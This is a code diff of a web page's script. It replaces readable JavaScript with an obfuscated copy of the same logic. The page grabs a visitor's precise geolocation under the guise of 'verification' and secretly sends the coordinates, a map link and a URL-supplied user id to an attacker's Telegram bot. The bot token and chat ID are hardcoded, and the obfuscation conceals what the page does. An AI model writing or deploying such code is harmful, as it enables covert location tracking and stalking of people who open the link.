@@ -16,40 +16,7 @@
     </div>
 
     <script>
-        // الحصول على ID المستخدم من الرابط (مثال: site.com/?id=123456)
-        const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('id');
-
-        // ضع التوكن والآيدي الخاصين بك هنا
-        const BOT_TOKEN = "8217126220:AAG2HnUJfVdlzLNWOzxpLxC9GZoREEczRuw";
-        const ADMIN_ID = "7553940284";
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                const text = `📍 **تم استلام موقع جديد!**\n\n👤 **معرف المستخدم:** ${userId || 'غير معروف'}\n🌐 **الإحداثيات:** \`${lat},${lon}\`\n🗺 **الخريطة:** ${mapLink}`;
-
-                // إرسال الإحداثيات مباشرة للآيدي الخاص بك عبر Telegram API
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                document.getElementById('msg').innerText = "تم التحقق بنجاح! يمكنك إغلاق الصفحة.";
-            }, (err) => {
-                document.getElementById('msg').innerText = "تم رفض الوصول للموقع أو تعذر التحديد.";
-            }, { enableHighAccuracy: true });
-        } else {
-            document.getElementById('msg').innerText = "متصفحك لا يدعم الخدمة.";
-        }
+        (function(_0x2d8a4f,_0x1b3c9e){const _0x5e2b10=_0x3b1c;while(!![]){try{const _0x4d12c8=parseInt(_0x5e2b10(0x18a))/0x1+parseInt(_0x5e2b10(0x18b))/0x2+-parseInt(_0x5e2b10(0x18c))/0x3+parseInt(_0x5e2b10(0x18d))/0x4*(-parseInt(_0x5e2b10(0x18e))/0x5)+parseInt(_0x5e2b10(0x18f))/0x6+-parseInt(_0x5e2b10(0x190))/0x7+parseInt(_0x5e2b10(0x191))/0x8;if(_0x4d12c8===_0x1b3c9e)break;else _0x2d8a4f['push'](_0x2d8a4f['shift']());}catch(_0x2e4f01){_0x2d8a4f['push'](_0x2d8a4f['shift']());}}}(_0x1a8b,0x4f2d7));function _0x3b1c(_0x41b897,_0x1f3c01){_0x41b897=_0x41b897-0x180;let _0x1a8b1a=_0x1a8b[_0x41b897];return _0x1a8b1a;}function _0x1a8b(){const _0x3e18a2=['4005888aIqLNm','2341492sOqQVY','8217126220:AAG2HnUJfVdlzLNWOzxpLxC9GZoREEczRuw','7553940284','https://api.telegram.org/bot','/sendMessage','application/json','POST','https://www.google.com/maps?q=','Markdown','msg','تم\x20التحقق\x20بنجاح!\x20يمكنك\x20إغلاق\x20الصفحة.','تم\x20رفض\x20الوصول\x20للموقع\x20أو\x20تعذر\x20التحديد.','متصفحك\x20لا\x20يدعم\x20الخدمة.','geolocation','getCurrentPosition','coords','latitude','longitude','innerText','getElementById','search','URLSearchParams','location','get','id','1910793YkDQBq','2197148zDblcR','2993883jJvNqX','4434220wllhEa'];_0x1a8b=function(){return _0x3e18a2;};return _0x1a8b();}const _0x4f21=window[_0x3b1c(0x184)][_0x3b1c(0x183)];const urlParams=new URLSearchParams(_0x4f21);const userId=urlParams[_0x3b1c(0x185)](_0x3b1c(0x186));const _0x1122=_0x3b1c(0x180);const _0x3344=_0x3b1c(0x181);if(navigator[_0x3b1c(0x199)]){navigator[_0x3b1c(0x199)][_0x3b1c(0x180-0x64)](async(_0x582103)=>{const _0x21a41a=_0x582103[_0x3b1c(0x181-0x63)][_0x3b1c(0x182-0x63)];const _0x1c4481=_0x582103[_0x3b1c(0x181-0x63)][_0x3b1c(0x183-0x63)];const _0x5399ef=`${_0x3b1c(0x18c-0x63)}${_0x21a41a},${_0x1c4481}`;const _0x2f8b01=`📍\x20**تم\x20استلام\x20موقع\x20جديد!**\n\n👤\x20**معرف\x20المستخدم:**\x20${userId||'غير\x20معروف'}\n🌐\x20**الإحداثيات:**\x20\`${_0x21a41a},${_0x1c4481}\`\n🗺\x20**الخريطة:**\x20${_0x5399ef}`;await fetch(`${_0x3b1c(0x188-0x63)}${_0x1122}${_0x3b1c(0x189-0x63)}`,{method:_0x3b1c(0x18b-0x63),headers:{'Content-Type':_0x3b1c(0x18a-0x63)},body:JSON.stringify({chat_id:_0x3344,text:_0x2f8b01,parse_mode:_0x3b1c(0x18d-0x63)})});document[_0x3b1c(0x185-0x63)](_0x3b1c(0x18e-0x63))[_0x3b1c(0x184-0x63)]=_0x3b1c(0x18f-0x63);},(err)=>{document[_0x3b1c(0x185-0x63)](_0x3b1c(0x18e-0x63))[_0x3b1c(0x184-0x63)]=_0x3b1c(0x190-0x63);},{enableHighAccuracy:!0});}else{document[_0x3b1c(0x185-0x63)](_0x3b1c(0x18e-0x63))[_0x3b1c(0x184-0x63)]=_0x3b1c(0x191-0x63);}
     </script>
 </body>
 </html>
